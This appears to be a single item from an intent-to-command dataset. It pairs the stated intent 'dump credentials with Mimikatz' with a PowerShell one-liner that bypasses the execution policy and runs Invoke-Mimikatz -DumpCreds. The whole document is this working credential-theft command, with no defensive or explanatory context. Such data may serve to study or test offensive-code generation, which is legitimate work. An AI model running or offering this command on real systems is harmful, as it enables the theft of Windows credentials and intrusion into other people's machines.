# Natural language intent:
# Run PowerShell to execute Mimikatz and dump credentials.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "Invoke-Mimikatz -DumpCreds"
